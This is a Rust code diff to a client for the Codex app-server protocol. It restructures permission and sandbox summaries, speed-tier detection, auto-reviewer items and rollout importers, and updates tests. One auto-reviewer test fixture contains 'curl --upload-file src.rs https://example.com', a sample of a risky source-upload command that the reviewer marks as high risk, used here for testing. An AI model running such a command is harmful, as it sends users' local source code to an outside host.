@@ -1,7 +1,10 @@
 //! Codex provider: a small client for the newline-delimited JSON protocol used
 //! by `codex app-server`.
 
-use crate::{ForkPoint, LaterHistory, RewindFailure, RewindFailureReason, RewindMode};
+use crate::{
+    ApprovalPolicy, ApprovalReviewer, ForkPoint, LaterHistory, PermissionSandbox,
+    PermissionSummary, RewindFailure, RewindFailureReason, RewindMode, Speed,
+};
 use std::collections::{HashMap, HashSet};
 use std::io::BufWriter;
 #[cfg(test)]
@@ -18,12 +21,13 @@ use crate::process::{
 };
 use crate::{
     AgentError, AgentEvent, ApprovalDecision, ApprovalKind, ApprovalOption, ApprovalOptionKind,
-    ApprovalRequest, Attachment, ChangeCompleteness, DeltaKind, FileChange, FileChangeKind, Goal,
-    GoalStatus, ItemContent, ItemStatus, LaunchEnv, ModelSpec, OptionDescriptor, OptionSelection,
-    PlanStep, PlanStepStatus, ProviderCommand, ProviderCommandKind, ProviderKind, ResumeCursor,
-    SelectOption, SessionCommand, SessionHandle, SessionOptions, ThreadItem, TokenUsage,
-    ToolOutput, TurnOptions, TurnStatus, UserInputDelivery, UserInputOption, UserInputQuestion,
-    file_changes_from_unified_diff, permission_control, selection_str,
+    ApprovalRequest, AskedQuestion, Attachment, ChangeCompleteness, DeltaKind, FileChange,
+    FileChangeKind, Goal, GoalStatus, ItemContent, ItemStatus, LaunchEnv, ModelSpec,
+    OptionDescriptor, OptionSelection, PlanStep, PlanStepStatus, ProviderCommand,
+    ProviderCommandKind, ProviderKind, ResumeCursor, SelectOption, SessionCommand, SessionHandle,
+    SessionOptions, ThreadItem, TokenUsage, ToolFamily, ToolOutput, TurnOptions, TurnStatus,
+    UserInputDelivery, UserInputOption, UserInputQuestion, file_changes_from_unified_diff,
+    permission_control, selection_str,
 };
 
 mod developer_instructions;
@@ -110,43 +114,48 @@ fn current_permission_option(effective: &str, settings: &Value) -> SelectOption 
         .or_else(|| settings.get("sandbox"))
         .and_then(|sandbox| sandbox.get("type"))
         .and_then(Value::as_str);
+    // `v2/SandboxPolicy.ts`, `AskForApproval.ts` and `ApprovalsReviewer.ts`
+    // (codex 0.167.0); the reviewer is `user` when unset.
     let sandbox = match sandbox {
-        Some("readOnly") => "read-only sandbox",
-        Some("workspaceWrite") => "workspace sandbox",
-        Some("dangerFullAccess") => "full access",
-        Some("externalSandbox") => "external sandbox",
-        _ => "unspecified sandbox",
+        Some("readOnly") => Some(PermissionSandbox::ReadOnly),
+        Some("workspaceWrite") => Some(PermissionSandbox::WorkspaceWrite),
+        Some("dangerFullAccess") => Some(PermissionSandbox::FullAccess),
+        Some("externalSandbox") => Some(PermissionSandbox::External),
+        _ => None,
     };
     let approval = match settings.get("approvalPolicy") {
         Some(Value::String(policy)) => match policy.as_str() {
-            "on-request" => "asks on request",
-            "never" => "never asks for approval",
-            "untrusted" => "asks for untrusted actions",
-            "granular" => "uses granular approval rules",
-            _ => "unspecified approval policy",
+            "on-request" => Some(ApprovalPolicy::OnRequest),
+            "never" => Some(ApprovalPolicy::Never),
+            "untrusted" => Some(ApprovalPolicy::Untrusted),
+            _ => None,
         },
         Some(Value::Object(policy)) if policy.contains_key("granular") => {
-            "uses granular approval rules"
+            Some(ApprovalPolicy::Granular)
         }
-        _ => "unspecified approval policy",
+        _ => None,
     };
     let reviewer = match settings.get("approvalsReviewer").and_then(Value::as_str) {
-        Some("auto_review" | "guardian_subagent") => "reviewed by auto-review",
-        Some("user") | None => "reviewed by you",
-        _ => "unspecified reviewer",
+        Some("auto_review" | "guardian_subagent") => Some(ApprovalReviewer::AutoReview),
+        Some("user") | None => Some(ApprovalReviewer::User),
+        _ => None,
     };
     let profile = settings
         .pointer("/activePermissionProfile/id")
         .and_then(Value::as_str)
         .or_else(|| effective.strip_prefix("profile:"));
-    let prefix = profile
-        .map(|id| format!("Profile {id}: "))
-        .unwrap_or_default();
     SelectOption {
         value: effective.into(),
         label: profile.unwrap_or("Current permissions").into(),
-        description: Some(format!("{prefix}{sandbox}, {approval}, {reviewer}.")),
+        description: None,
         unavailable: Some("Inherited permission configuration".into()),
+        speed: None,
+        summary: Some(PermissionSummary {
+            profile: profile.map(str::to_owned),
+            sandbox,
+            approval,
+            reviewer,
+        }),
     }
 }
 
@@ -183,16 +192,15 @@ fn permission_descriptor(
         options.push(SelectOption {
             value,
             label: id.into(),
-            description: Some(
-                profile
-                    .get("description")
-                    .and_then(Value::as_str)
-                    .filter(|description| !description.is_empty())
-                    .unwrap_or("Configured permission profile")
-                    .into(),
-            ),
+            description: profile
+                .get("description")
+                .and_then(Value::as_str)
+                .filter(|description| !description.is_empty())
+                .map(str::to_owned),
             unavailable: (profile.get("allowed").and_then(Value::as_bool) == Some(false))
                 .then(|| "Not allowed by your configuration".into()),
+            speed: None,
+            summary: None,
         });
     }
     if !options.iter().any(|option| option.value == effective) {
@@ -400,6 +408,8 @@ fn map_model(model: &Value, windows: Option<&model_windows::ModelWindows>) -> Op
                     value,
                     label,
                     description,
+                    speed: None,
+                    summary: None,
                 })
             })
             .collect();
@@ -409,7 +419,7 @@ fn map_model(model: &Value, windows: Option<&model_windows::ModelWindows>) -> Op
                 .and_then(Value::as_str)
                 .map(str::to_owned);
             options.push(OptionDescriptor::Select {
-                role: Default::default(),
+                role: crate::OptionRole::Effort,
                 apply: Default::default(),
                 recommended: None,
                 permissive: None,
@@ -435,10 +445,12 @@ fn map_model(model: &Value, windows: Option<&model_windows::ModelWindows>) -> Op
             value: "default".into(),
             label: "Standard".into(),
             description: None,
+            speed: None,
+            summary: None,
         });
         select_options.extend(tiers);
         options.push(OptionDescriptor::Select {
-            role: Default::default(),
+            role: crate::OptionRole::Speed,
             apply: Default::default(),
             recommended: None,
             permissive: None,
@@ -458,8 +470,6 @@ fn map_model(model: &Value, windows: Option<&model_windows::ModelWindows>) -> Op
     })
 }
 
-/// Derive service-tier options from `serviceTiers` (preferred) or, absent that,
-/// `additionalSpeedTiers`, displaying the `fast` value as `Fast`.
 /// The `contextWindow` selector: the native window (default) and the largest
 /// one Codex accepts for `model_context_window`. Without cached windows the
 /// selector has no presets and the custom size stands alone.
@@ -471,6 +481,8 @@ fn context_window_descriptor(windows: Option<&model_windows::ModelWindows>) -> O
             label,
             description: None,
             unavailable: None,
+            speed: None,
+            summary: None,
         }
     };
     let (options, default_value) = match windows {
@@ -485,7 +497,7 @@ fn context_window_descriptor(windows: Option<&model_windows::ModelWindows>) -> O
         None => (Vec::new(), None),
     };
     OptionDescriptor::Select {
-        role: Default::default(),
+        role: crate::OptionRole::ContextWindow,
         apply: Default::default(),
         recommended: None,
         permissive: None,
@@ -516,33 +528,30 @@ fn service_tiers(model: &Value) -> Vec<SelectOption> {
                     .map(str::to_owned);
                 Some(SelectOption {
                     unavailable: None,
+                    speed: tier_speed(&value, &label),
                     value,
                     label,
                     description,
-                })
-            })
-            .collect();
-    }
-    if let Some(speed) = model.get("additionalSpeedTiers").and_then(Value::as_array) {
-        return speed
-            .iter()
-            .filter_map(|tier| {
-                let value = tier.as_str()?.to_owned();
-                let label = if value == "fast" {
-                    "Fast".to_owned()
-                } else {
-                    value.clone()
-                };
-                Some(SelectOption {
-                    unavailable: None,
-                    value,
-                    label,
-                    description: None,
+                    summary: None,
                 })
             })
             .collect();
     }
     Vec::new()
+}
+
+/// Which service tiers are Codex's fast mode, as ChatGPT.app (26.1103) tells
+/// them: the `priority` or `fast` id or a tier named Fast, and the
+/// `ultrafast` id or a tier named Ultrafast.
+fn tier_speed(id: &str, name: &str) -> Option<Speed> {
+    let name = name.trim().to_ascii_lowercase();
+    if matches!(id, "priority" | "fast") || name == "fast" {
+        Some(Speed::Fast)
+    } else if id == "ultrafast" || name == "ultrafast" {
+        Some(Speed::Ultrafast)
+    } else {
+        None
+    }
 }
 
 /// Format model ids for display: `gpt…` → `GPT…`, capitalizing the letter
@@ -834,7 +843,7 @@ async fn run_actor(
     extra_args.extend(opts.extra_args.iter().cloned());
     let (mut child, mut stdin, lines, mut stderr_tail) =
         match spawn_server(opts.binary_path.as_deref(), &extra_args, &opts.launch_env) {
-            Ok(parts) => parts,
+            Ok((child, stdin, lines, tail)) => (opts.processes.hold(child), stdin, lines, tail),
             Err(err) => {
                 let _ = ready.send(Err(err)).await;
                 return;
@@ -1371,12 +1380,9 @@ impl SessionActor for Actor {
         self.background_terminal_read
     }
 
+    /// The actor loop calls this once [`Self::wake_at`] has come.
     async fn wake(&mut self) -> Result<(), String> {
-        if self
-            .background_terminal_read
-            .is_some_and(|at| at <= std::time::Instant::now())
-        {
-            self.background_terminal_read = None;
+        if self.background_terminal_read.take().is_some() {
             return self.read_background_terminals();
         }
         Ok(())
@@ -1869,20 +1875,14 @@ impl Actor {
             .get("rationale")
             .and_then(Value::as_str)
             .unwrap_or_default();
-        let risk = review
-            .get("riskLevel")
-            .and_then(Value::as_str)
-            .unwrap_or("unknown");
         let Some(id) = params.get("reviewId").and_then(Value::as_str) else {
             return;
         };
         let summary = auto_review_action_summary(params.get("action").unwrap_or(&Value::Null));
-        let detail = format!("Risk: {risk}. {summary}");
-        let detail = if rationale.is_empty() {
-            detail
-        } else {
-            format!("{rationale}\n{detail}")
-        };
+        let mut input = json!({"summary":summary, "targetItemId":params.get("targetItemId")});
+        if let Some(risk) = review.get("riskLevel").filter(|risk| !risk.is_null()) {
+            input["risk"] = risk.clone();
+        }
         let item_status = match status {
             "inProgress" => ItemStatus::InProgress,
             "approved" => ItemStatus::Completed,
@@ -1895,9 +1895,10 @@ impl Actor {
             content: ItemContent::ToolCall {
                 image_reads: Vec::new(),
                 name: "Auto-reviewer".into(),
-                input: json!({"summary":summary, "targetItemId":params.get("targetItemId")}),
-                output: Some(detail),
+                input,
+                output: (!rationale.is_empty()).then(|| rationale.to_owned()),
                 status: item_status,
+                family: None,
             },
         };
         self.events
@@ -4008,6 +4009,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
             input: json!({ "questions": item.get("questions").cloned().unwrap_or_default() }),
             output: None,
             status: ItemStatus::Completed,
+            family: question_family(ASYNC_QUESTION_TOOL, item, None).map(Box::new),
         },
         "plan" | "proposed_plan" => ItemContent::Plan {
             markdown: string_field(item, "text"),
@@ -4068,6 +4070,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
                     .map(str::to_owned)
                     .or(result.map(|_| text)),
                 status: map_status(item.get("status").and_then(Value::as_str)),
+                family: None,
             }
         }
         "collabAgentToolCall" => ItemContent::ToolCall {
@@ -4080,6 +4083,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
                 .filter(|states| !states.is_empty())
                 .map(|_| item["agentsStates"].to_string()),
             status: map_status(item.get("status").and_then(Value::as_str)),
+            family: None,
         },
         "imageView" => ItemContent::ImageRead {
             path: string_field(item, "path"),
@@ -4096,6 +4100,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
             input: json!({ "duration_ms": item.get("durationMs").cloned().unwrap_or(Value::Null) }),
             output: None,
             status: map_status(item.get("status").and_then(Value::as_str)),
+            family: None,
         },
         "imageGeneration" => image_generation(item),
         _ => ItemContent::Other {
@@ -4167,7 +4172,139 @@ pub fn image_generation(item: &Value) -> ItemContent {
         input: Value::Object(input),
         output: failure.map(Value::to_string),
         status,
+        family: None,
     }
+}
+
+/// The questions a call of Codex's question tool `name` asked, from its
+/// input, and the answers each got, from its output. `request_user_input`
+/// asks `{id, question, options: [{label, description}]}` and is answered
+/// `{"answers": {<id>: {"answers": [...]}}}`
+/// (`request_user_input_spec.rs`, `protocol/src/request_user_input.rs` at
+/// `rust-v0.167.0`); `request_user_input_async` asks `{title, options?}`
+/// with option labels alone (`AsyncUserInputQuestion`,
+/// `protocol/src/items.rs`) and is answered in a later message, not here.
+/// The importer reads a rollout's calls through this.
+pub fn question_family(name: &str, input: &Value, output: Option<&str>) -> Option<ToolFamily> {
+    let asked = input.get("questions")?.as_array()?;
+    let answered: Option<Value> = output.and_then(|output| serde_json::from_str(output).ok());
+    let text = |value: &Value, key: &str| value.get(key).and_then(Value::as_str).map(str::to_owned);
+    let questions = match name {
+        "request_user_input" => asked
+            .iter()
+            .filter_map(|question| {
+                let answers = question
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .and_then(|id| answered.as_ref()?.get("answers")?.get(id)?.get("answers"))
+                    .and_then(Value::as_array);
+                Some(AskedQuestion {
+                    question: text(question, "question")?,
+                    options: question
+                        .get("options")
+                        .and_then(Value::as_array)
+                        .into_iter()
+                        .flatten()
+                        .filter_map(|option| {
+                            Some(UserInputOption {
+                                label: text(option, "label")?,
+                                description: text(option, "description").unwrap_or_default(),
+                            })
+                        })
+                        .collect(),
+                    answers: answers
+                        .into_iter()
+                        .flatten()
+                        .filter_map(Value::as_str)
+                        .map(str::to_owned)
+                        .collect(),
+                })
+            })
+            .collect(),
+        ASYNC_QUESTION_TOOL => asked
+            .iter()
+            .filter_map(|question| {
+                Some(AskedQuestion {
+                    question: text(question, "title")?,
+                    options: question
+                        .get("options")
+                        .and_then(Value::as_array)
+                        .into_iter()
+                        .flatten()
+                        .filter_map(Value::as_str)
+                        .map(|label| UserInputOption {
+                            label: label.to_owned(),
+                            description: String::new(),
+                        })
+                        .collect(),
+                    answers: Vec::new(),
+                })
+            })
+            .collect(),
+        _ => return None,
+    };
+    Some(ToolFamily::Question { questions })
+}
+
+/// A command as a rollout records Codex's own `CommandExecution` turn item
+/// (`CommandExecutionItem`, `protocol/src/items.rs` at `rust-v0.167.0`: the
+/// argv as `command`, `aggregated_output`, `exit_code`, a snake_case
+/// `status`), shown as the live `commandExecution` item of the same command
+/// is. The importer reads it through this.
+pub fn rollout_command(item: &Value) -> ItemContent {
+    let argv: Vec<&str> = item
+        .get("command")
+        .and_then(Value::as_array)
+        .into_iter()
+        .flatten()
+        .filter_map(Value::as_str)
+        .collect();
+    ItemContent::CommandExecution {
+        command: shell_script(&shell_words::join(argv)),
+        output: string_field(item, "aggregated_output"),
+        exit_code: item
+            .get("exit_code")
+            .and_then(Value::as_i64)
+            .and_then(|code| i32::try_from(code).ok()),
+        status: map_status(item.get("status").and_then(Value::as_str)),
+    }
+}
+
+/// The files a rollout records a patch changing: the `changes` of Codex's
+/// `FileChange` turn item or of its `patch_apply_end` event, each path's
+/// `FileChange` (`protocol/src/protocol.rs` at `rust-v0.167.0`: `add` and
+/// `delete` with the file's `content`, `update` with a `unified_diff` and a
+/// `move_path`). They are converted as the app-server converts them for the
+/// live `fileChange` item (`convert_patch_changes`,
+/// `app-server-protocol/src/protocol/item_builders.rs`), and then read as
+/// that item's changes are.
+pub fn rollout_file_changes(changes: &Value) -> Vec<FileChange> {
+    let mut changes: Vec<FileChange> = changes
+        .as_object()
+        .into_iter()
+        .flatten()
+        .filter_map(|(path, change)| {
+            let text = |key: &str| change.get(key).and_then(Value::as_str).unwrap_or_default();
+            let move_path = change.get("move_path").and_then(Value::as_str);
+            let diff = match (change.get("type").and_then(Value::as_str), move_path) {
+                (Some("update"), Some(to)) => format!("{}\n\nMoved to: {to}", text("unified_diff")),
+                (Some("update"), None) => text("unified_diff").to_owned(),
+                _ => text("content").to_owned(),
+            };
+            map_file_change(&json!({
+                "path": path,
+                "kind": {"type": change.get("type"), "move_path": move_path},
+                "diff": diff,
+            }))
+        })
+        .collect();
+    changes.sort_by(|a, b| a.path.cmp(&b.path));
+    changes
+}
+
+/// A rollout's snake_case status of a turn item, as its live item's.
+pub fn rollout_status(status: Option<&str>) -> ItemStatus {
+    map_status(status)
 }
 
 fn collab_tool_input(item: &Value) -> Value {
@@ -4305,6 +4442,36 @@ fn goal_status_wire(status: GoalStatus) -> &'static str {
 }
 
 /// One `turn/plan/updated` step (`v2/TurnPlanStep.ts`).
+/// The plan an `update_plan` call sets, as a rollout records its
+/// arguments: `{explanation?, plan: [{step, status}]}` with a snake_case
+/// status (`UpdatePlanArgs`, `protocol/src/plan_tool.rs` at
+/// `rust-v0.167.0`). Live, Codex reports the same plan as
+/// `turn/plan/updated`, never as a call; the importer reads it through this.
+pub fn rollout_plan(arguments: &Value) -> Option<(Option<String>, Vec<PlanStep>)> {
+    let steps = arguments
+        .get("plan")?
+        .as_array()?
+        .iter()
+        .filter_map(|step| {
+            let status = match step.get("status")?.as_str()? {
+                "pending" => PlanStepStatus::Pending,
+                "in_progress" => PlanStepStatus::InProgress,
+                "completed" => PlanStepStatus::Completed,
+                _ => return None,
+            };
+            Some(PlanStep {
+                step: step.get("step")?.as_str()?.to_owned(),
+                status,
+            })
+        })
+        .collect();
+    let explanation = arguments
+        .get("explanation")
+        .and_then(Value::as_str)
+        .map(str::to_owned);
+    Some((explanation, steps))
+}
+
 fn map_plan_step(step: &Value) -> Option<PlanStep> {
     let status = match step.get("status")?.as_str()? {
         "pending" => PlanStepStatus::Pending,
@@ -4418,6 +4585,42 @@ fn model_reroute(params: &Value) -> Option<(String, Option<String>)> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// request_user_input is answered by question id (`{"answers": {<id>:
+    /// {"answers": [...]}}}`, `protocol/src/request_user_input.rs` at
+    /// rust-v0.167.0); request_user_input_async asks titles with bare
+    /// option labels and is answered later (`AsyncUserInputQuestion`,
+    /// `protocol/src/items.rs`). Content invented.
+    #[test]
+    fn a_question_is_what_it_asked_and_the_answers_by_its_id() {
+        let asked = question_family(
+            "request_user_input",
+            &json!({"questions": [{"id": "scope", "header": "Scope", "question": "Which part first?", "options": [{"label": "Sign-in", "description": "Accounts"}, {"label": "Sync, export", "description": "Data"}]}]}),
+            Some(r#"{"answers": {"scope": {"answers": ["Sync, export"]}}}"#),
+        );
+        let Some(ToolFamily::Question { questions }) = asked else {
+            panic!("{asked:?}");
+        };
+        assert_eq!(questions[0].question, "Which part first?");
+        assert_eq!(questions[0].answers, ["Sync, export"]);
+        let asked = question_family(
+            ASYNC_QUESTION_TOOL,
+            &json!({"questions": [{"title": "Ship it?", "options": ["Yes", "Not yet"]}]}),
+            None,
+        );
+        let Some(ToolFamily::Question { questions }) = asked else {
+            panic!("{asked:?}");
+        };
+        assert_eq!(
+            questions[0]
+                .options
+                .iter()
+                .map(|option| option.label.as_str())
+                .collect::<Vec<_>>(),
+            ["Yes", "Not yet"]
+        );
+        assert!(questions[0].answers.is_empty());
+    }
 
     /// A `CODEX_HOME` the user set in the profile's environment is where the
     /// CLI keeps its sign-in and sessions, so it is where Tcode reads them.
@@ -4556,38 +4759,59 @@ mod tests {
                     .collect::<Vec<_>>(),
                 vec![
                     ("profile:restricted", Some("Only this workspace"), false),
-                    (
-                        "profile:blocked",
-                        Some("Configured permission profile"),
-                        true
-                    )
+                    ("profile:blocked", None, true)
                 ]
             );
-            for (settings, label, description) in [
+            for (settings, label, summary) in [
                 (
                     json!({"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"never","approvalsReviewer":"user"}),
                     "Current permissions",
-                    "workspace sandbox, never asks for approval, reviewed by you.",
+                    (
+                        None,
+                        PermissionSandbox::WorkspaceWrite,
+                        ApprovalPolicy::Never,
+                        ApprovalReviewer::User,
+                    ),
                 ),
                 (
                     json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"on-request","approvalsReviewer":"user"}),
                     "my-team",
-                    "Profile my-team: workspace sandbox, asks on request, reviewed by you.",
+                    (
+                        Some("my-team"),
+                        PermissionSandbox::WorkspaceWrite,
+                        ApprovalPolicy::OnRequest,
+                        ApprovalReviewer::User,
+                    ),
                 ),
                 (
                     json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"readOnly"},"approvalPolicy":"untrusted","approvalsReviewer":"auto_review"}),
                     "my-team",
-                    "Profile my-team: read-only sandbox, asks for untrusted actions, reviewed by auto-review.",
+                    (
+                        Some("my-team"),
+                        PermissionSandbox::ReadOnly,
+                        ApprovalPolicy::Untrusted,
+                        ApprovalReviewer::AutoReview,
+                    ),
                 ),
                 (
                     json!({"sandboxPolicy":{"type":"externalSandbox","networkAccess":"restricted"},"approvalPolicy":{"granular":{"sandbox_approval":false,"rules":true,"skill_approval":true,"request_permissions":true,"mcp_elicitations":true}},"approvalsReviewer":"guardian_subagent"}),
                     "Current permissions",
-                    "external sandbox, uses granular approval rules, reviewed by auto-review.",
+                    (
+                        None,
+                        PermissionSandbox::External,
+                        ApprovalPolicy::Granular,
+                        ApprovalReviewer::AutoReview,
+                    ),
                 ),
                 (
                     json!({"sandboxPolicy":{"type":"dangerFullAccess"},"approvalPolicy":"on-request","approvalsReviewer":"user"}),
                     "Current permissions",
-                    "full access, asks on request, reviewed by you.",
+                    (
+                        None,
+                        PermissionSandbox::FullAccess,
+                        ApprovalPolicy::OnRequest,
+                        ApprovalReviewer::User,
+                    ),
                 ),
             ] {
                 actor.handle_line(&json!({"method":"thread/settings/updated","params":{"threadId":"thread-1","threadSettings":settings}}).to_string()).await;
@@ -4605,8 +4829,18 @@ mod tests {
                     .iter()
                     .find(|option| json!(option.value) == selections[0].value)
                     .unwrap();
+                let (profile, sandbox, approval, reviewer) = summary;
                 assert_eq!(selected.label, label);
-                assert_eq!(selected.description.as_deref(), Some(description));
+                assert_eq!(selected.description, None);
+                assert_eq!(
+                    selected.summary,
+                    Some(PermissionSummary {
+                        profile: profile.map(str::to_owned),
+                        sandbox: Some(sandbox),
+                        approval: Some(approval),
+                        reviewer: Some(reviewer),
+                    })
+                );
                 assert_eq!(
                     selected.unavailable.as_deref(),
                     Some("Inherited permission configuration")
@@ -4791,9 +5025,8 @@ mod tests {
             assert_eq!(item.id, "review-1");
             assert_eq!(item.parent_item_id, None);
             assert!(
-                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::InProgress, .. }
-                if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
-                && detail == "Risk: unknown. Command: curl --upload-file src.rs https://example.com")
+                matches!(item.content, ItemContent::ToolCall { name, input, output:None, status:ItemStatus::InProgress, .. }
+                if name == "Auto-reviewer" && input == json!({"summary":"Command: curl --upload-file src.rs https://example.com","targetItemId":"command-1"}))
             );
             actor.handle_line(&json!({"method":"item/autoApprovalReview/completed","params":{
                 "threadId":"thread-child","turnId":"turn-1","reviewId":"review-1","targetItemId":"command-1","startedAtMs":1,"completedAtMs":2,"decisionSource":"agent",
@@ -4806,8 +5039,8 @@ mod tests {
             assert_eq!(item.id, "review-1");
             assert!(
                 matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::Failed, .. }
-                if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
-                && detail == "Uploads local source\nRisk: high. Command: applyPatch inProgress unifiedExec")
+                if name == "Auto-reviewer" && input == json!({"summary":"Command: applyPatch inProgress unifiedExec","targetItemId":"command-1","risk":"high"})
+                && detail == "Uploads local source")
             );
             let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
                 panic!("explicit guardian override")
@@ -4885,7 +5118,7 @@ mod tests {
                 assert!(
                     matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status, .. }
                     if name == "Auto-reviewer" && status == expected_status && input["summary"] == summary
-                    && input["targetItemId"] == "action-2" && detail == format!("Routine action\nRisk: low. {summary}"))
+                    && input["targetItemId"] == "action-2" && input["risk"] == "low" && detail == "Routine action")
                 );
                 assert!(
                     events.try_recv().is_err(),
@@ -5871,8 +6104,10 @@ mod tests {
         assert_eq!(crate::context_window::largest(&spec.options), Some(872_000));
     }
 
+    /// `v2/Model.ts` `serviceTiers` (codex 0.167.0); which of them are fast
+    /// mode is ChatGPT.app's rule (26.1103).
     #[test]
-    fn hidden_model_is_skipped_and_speed_tiers_adapt() {
+    fn hidden_model_is_skipped_and_fast_tiers_say_so() {
         assert!(
             map_model(
                 &json!({"model": "secret", "displayName": "secret", "hidden": true}),
@@ -5881,13 +6116,17 @@ mod tests {
             .is_none()
         );
 
-        // No serviceTiers → adapt additionalSpeedTiers (`fast` → `Fast`).
         let spec = map_model(
             &json!({
                 "model": "gpt-x",
                 "displayName": "gpt-x",
                 "supportedReasoningEfforts": [],
-                "additionalSpeedTiers": ["fast", "priority"]
+                "serviceTiers": [
+                    {"id": "priority", "name": "Fast", "description": ""},
+                    {"id": "flex", "name": "Flex", "description": ""},
+                    {"id": "ultrafast", "name": "Ultrafast", "description": ""}
+                ],
+                "defaultServiceTier": null
             }),
             None,
         )
@@ -5896,12 +6135,23 @@ mod tests {
         // a contextWindow selector without presets (no cached windows).
         assert_eq!(spec.options.len(), 2);
         match &spec.options[0] {
-            OptionDescriptor::Select { id, options, .. } => {
+            OptionDescriptor::Select {
+                id, options, role, ..
+            } => {
                 assert_eq!(id, "serviceTier");
-                assert_eq!(options[1].value, "fast");
-                assert_eq!(options[1].label, "Fast");
-                assert_eq!(options[2].value, "priority");
-                assert_eq!(options[2].label, "priority");
+                assert_eq!(*role, crate::OptionRole::Speed);
+                assert_eq!(
+                    options
+                        .iter()
+                        .map(|option| (option.value.as_str(), option.speed))
+                        .collect::<Vec<_>>(),
+                    [
+                        ("default", None),
+                        ("priority", Some(Speed::Fast)),
+                        ("flex", None),
+                        ("ultrafast", Some(Speed::Ultrafast)),
+                    ]
+                );
             }
             other => panic!("expected serviceTier Select, got {other:?}"),
         }
@@ -6017,7 +6267,7 @@ mod tests {
                 )
                 .await;
             while events.try_recv().is_ok() {}
-            actor.background_terminal_read = Some(std::time::Instant::now());
+            assert!(actor.wake_at().is_some(), "the turn's end schedules a read");
             actor.wake().await.unwrap();
             let list = sent(&mut actor).await;
             assert_eq!(list["method"], "thread/backgroundTerminals/list");
@@ -6054,7 +6304,6 @@ mod tests {
                 Ok(AgentEvent::BackgroundTasksChanged { count: 1 })
             ));
 
-            actor.background_terminal_read = Some(std::time::Instant::now());
             actor.wake().await.unwrap();
             let again = sent(&mut actor).await;
             answer(&mut actor, &again, running).await;
@@ -6203,8 +6452,6 @@ mod tests {
                     retry_at: None,
                 })]
             );
-            // The turn's end scheduled a background-terminal read; it has come due.
-            actor.background_terminal_read = Some(std::time::Instant::now());
             actor
                 .handle_command(SessionCommand::RetryTurn {
                     turn_id: "overloaded".into(),
@@ -6838,6 +7085,7 @@ mod tests {
             input: json!({"duration_ms": 20000}),
             output: None,
             status,
+            family: None,
         };
         assert_eq!(
             lifecycle_item("item/started", &sleep).unwrap().content,
@@ -6864,6 +7112,7 @@ mod tests {
             }),
             output: None,
             status: ItemStatus::Completed,
+            family: None,
         };
         assert_eq!(
             lifecycle_item("item/completed", &generation)
@@ -7634,6 +7883,7 @@ mod tests {
                     extra_args: Vec::new(),
                     acp: None,
                     instructions: None,
+                    processes: Default::default(),
                 };
                 let opened = initialize_and_open_thread(&options, &mut actor.stdin, &replies)
                     .await
@@ -7722,6 +7972,7 @@ mod tests {
                     extra_args: Vec::new(),
                     acp: None,
                     instructions: None,
+                    processes: Default::default(),
                 };
                 let opened = initialize_and_open_thread(&options, &mut actor.stdin, &replies)
                     .await
